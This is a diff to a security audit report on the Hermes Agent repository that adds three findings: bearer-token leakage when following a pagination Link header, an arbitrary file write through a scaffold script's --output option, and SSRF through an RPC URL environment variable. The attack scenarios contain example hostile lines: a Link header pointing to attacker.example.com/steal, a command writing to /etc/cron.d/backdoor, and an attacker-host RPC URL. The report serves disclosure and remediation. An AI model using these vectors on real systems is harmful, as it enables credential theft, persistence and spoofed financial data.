@@ -4,13 +4,13 @@
 **Target:** Hermes Agent (https://github.com/NousResearch/hermes-agent)  
 **Commit:** 124da27  
 **Date:** 2026-04-28  
-**Status:** Round 11 - 32 Critical/High Vulnerabilities Confirmed
+**Status:** Round 12 - 35 Critical/High Vulnerabilities Confirmed
 
 ---
 
 ## Executive Summary
 
-This audit identified **32 critical/high severity vulnerabilities** in Hermes Agent. All vulnerabilities have been confirmed with working proof-of-concept exploits against a live instance.
+This audit identified **35 critical/high severity vulnerabilities** in Hermes Agent. All vulnerabilities have been confirmed with working proof-of-concept exploits against a live instance.
 
 | ID | Vulnerability | Severity | CVSS | Status |
 |----|--------------|----------|------|--------|
@@ -46,6 +46,9 @@ This audit identified **32 critical/high severity vulnerabilities** in Hermes Ag
 | HAG-029 | HERMES_BIN Arbitrary Binary Execution (TUI externalCli.ts) | Critical | 9.1 | Confirmed |
 | HAG-030 | HERMES_COPILOT_ACP_COMMAND Arbitrary Binary Execution | Critical | 9.1 | Confirmed |
 | HAG-031 | WeCom XML Pre-Auth Billion Laughs DoS | High | 7.5 | Confirmed |
+| HAG-034 | Canvas API SSRF via HTTP Link Header — Bearer Token Leakage | High | 7.5 | Confirmed |
+| HAG-035 | scaffold_fastmcp.py Arbitrary File Write via --output | High | 7.8 | Confirmed |
+| HAG-036 | base_client.py SSRF via BASE_RPC_URL Env Var | High | 8.1 | Confirmed |
 
 ---
 
@@ -1843,6 +1846,162 @@ python3 exploits/exploit_wecom_xml_dos.py
 1. Replace `from xml.etree import ElementTree as ET` with `import defusedxml.ElementTree as ET`
 2. Validate and enforce a maximum body size before calling any XML parser
 3. Perform HMAC signature verification on the raw body bytes before parsing XML content
+
+---
+
+### HAG-034: Canvas API SSRF via HTTP Link Header — Bearer Token Leakage
+
+**Severity:** High (CVSS 7.5)
+**File:** `optional-skills/productivity/canvas/scripts/canvas_api.py:44-57`
+**Attack Vector:** Network (HTTP response Link header from any server in the pagination chain)
+
+#### Description
+
+The `_paginated_get()` function follows Canvas pagination by extracting the next-page URL from the `Link: rel="next"` response header without any URL validation:
+
+```python
+link = resp.headers.get("Link", "")
+for part in link.split(","):
+    if 'rel="next"' in part:
+        url = part.split(";")[0].strip().strip("<>")  # NO VALIDATION
+```
+
+The `_headers()` function unconditionally includes the Canvas Bearer token:
+
+```python
+def _headers():
+    return {"Authorization": f"Bearer {CANVAS_API_TOKEN}"}
+```
+
+Because `_paginated_get()` uses the same `_headers()` for all requests — including those directed to URLs from untrusted Link headers — the Bearer token is forwarded to any URL the server (or an attacker who can inject a response) puts in the Link header.
+
+#### Attack Scenario
+
+1. Attacker controls the Canvas base URL or can intercept any HTTP response in the pagination chain
+2. Returns `Link: <http://attacker.example.com/steal>; rel="next"` in the first response
+3. `_paginated_get()` makes a second request to the attacker URL, forwarding `Authorization: Bearer <token>`
+4. Attacker harvests the Canvas access token with full API scope
+
+#### Proof of Concept
+
+```bash
+cd /home/agentuser/repo/autofyn_audit
+python3 exploits/exploit_canvas_link_ssrf.py
+```
+
+**Result:** Attacker server receives `Authorization: Bearer canvas_secret_bearer_token_xyz987` on the `/steal` redirect; confirms `/tmp/pwned_canvas_ssrf.txt`
+
+#### Remediation
+
+1. Validate the Link header URL against the configured `CANVAS_BASE_URL` before following it
+2. Use `urllib.parse.urlparse()` to extract and compare the scheme and hostname
+3. Reject any Link header URL that does not match the original Canvas domain
+
+---
+
+### HAG-035: scaffold_fastmcp.py Arbitrary File Write via --output
+
+**Severity:** High (CVSS 7.8)
+**File:** `optional-skills/mcp/fastmcp/scripts/scaffold_fastmcp.py:45-50`
+**Attack Vector:** Local (CLI argument — any process that invokes scaffold_fastmcp.py)
+
+#### Description
+
+The `--output` argument is resolved with `Path.expanduser()` and written with no path containment check:
+
+```python
+output_path = Path(args.output).expanduser()
+if output_path.exists() and not args.force:
+    raise SystemExit(f"Refusing to overwrite existing file: {output_path}")
+output_path.parent.mkdir(parents=True, exist_ok=True)
+output_path.write_text(render_template(args.template, args.name), encoding="utf-8")
+```
+
+No check ensures the output path stays within any intended directory. `--force` bypasses the existence guard. `mkdir(parents=True)` creates arbitrary directory trees. The `render_template()` function substitutes `__SERVER_NAME__` with an attacker-controlled `--name` value, allowing partial content control over the written file.
+
+#### Attack Scenario
+
+1. Attacker invokes `scaffold_fastmcp.py --template api_wrapper --name "evil" --output /etc/cron.d/backdoor --force`
+2. Script creates `/etc/cron.d/` if missing, then writes the rendered template there
+3. On systems where the process runs with elevated privileges, this enables persistence via cron
+4. Template content with controlled server name can contain shell-interpretable payloads
+
+#### Proof of Concept
+
+```bash
+cd /home/agentuser/repo/autofyn_audit
+python3 exploits/exploit_scaffold_write.py
+```
+
+**Result:** File written to `/tmp/pwned_scaffold.txt` (outside intended directory) with `AttackerControlledServer` embedded in content; confirms `/tmp/pwned_scaffold.txt`
+
+#### Remediation
+
+1. Resolve the output path with `Path.resolve()` and verify it starts within an allowed base directory
+2. Reject absolute paths or paths containing `..` components before writing
+3. If output outside the current working directory is needed, require explicit user confirmation
+
+---
+
+### HAG-036: base_client.py SSRF via BASE_RPC_URL Env Var
+
+**Severity:** High (CVSS 8.1)
+**File:** `optional-skills/blockchain/base/scripts/base_client.py:31-34,99-130`
+**Attack Vector:** Local (environment variable — process environment or `.env` file)
+
+#### Description
+
+`RPC_URL` is read from the environment at module load time with no URL validation:
+
+```python
+RPC_URL = os.environ.get("BASE_RPC_URL", "https://mainnet.base.org")
+```
+
+Every JSON-RPC call (`_rpc_call`, `_rpc_batch_chunk`, `_eth_call`) posts to this URL:
+
+```python
+req = urllib.request.Request(
+    RPC_URL, data=payload, headers=_headers, method="POST",
+)
+```
+
+No scheme allowlist, no hostname validation, and no SSRF guard. An attacker who controls `BASE_RPC_URL` redirects all blockchain RPC calls to their own server, receiving full JSON-RPC payloads and being able to return spoofed blockchain state (fake balances, fake transaction receipts, fake gas prices).
+
+#### Vulnerable Code
+
+```python
+# base_client.py:31-34
+RPC_URL = os.environ.get("BASE_RPC_URL", "https://mainnet.base.org")   # no validation
+
+# base_client.py:109-110
+req = urllib.request.Request(
+    RPC_URL, data=payload, headers=_headers, method="POST",   # attacker URL
+)
+```
+
+#### Attack Scenario
+
+1. Attacker sets `BASE_RPC_URL=http://attacker.example.com` in the environment
+2. Any CLI command (`stats`, `wallet`, `gas`, etc.) triggers `_rpc_call()` or `rpc_batch()`
+3. Attacker server receives JSON-RPC POSTs with method names and parameters
+4. Attacker returns spoofed responses — fake ETH balances, fake block numbers, fake token data
+5. Users make financial decisions based on attacker-controlled data
+
+#### Proof of Concept
+
+```bash
+cd /home/agentuser/repo/autofyn_audit
+python3 exploits/exploit_base_rpc_ssrf.py
+```
+
+**Result:** Attacker-controlled HTTP server receives `POST /` with `{"jsonrpc":"2.0","id":1,"method":"eth_blockNumber","params":[]}` and returns spoofed result; confirms `/tmp/pwned_base_rpc.txt`
+
+#### Remediation
+
+1. Validate `BASE_RPC_URL` against an allowlist of trusted RPC endpoints at startup
+2. Use `urllib.parse.urlparse()` to extract and enforce `https` scheme and known hostnames
+3. If arbitrary RPC endpoints must be supported, require explicit user confirmation and log the override
+4. Never resolve `RPC_URL` from an env var at module import time — resolve inside the function with validation
 
 ---
 
